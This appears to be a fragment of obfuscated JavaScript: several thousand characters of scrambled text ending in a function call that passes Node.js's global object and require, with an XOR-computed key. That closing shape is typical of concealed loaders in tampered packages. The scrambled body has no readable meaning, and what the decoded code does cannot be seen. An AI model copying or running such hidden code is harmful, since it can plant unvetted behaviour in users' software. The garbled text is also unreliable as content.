oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
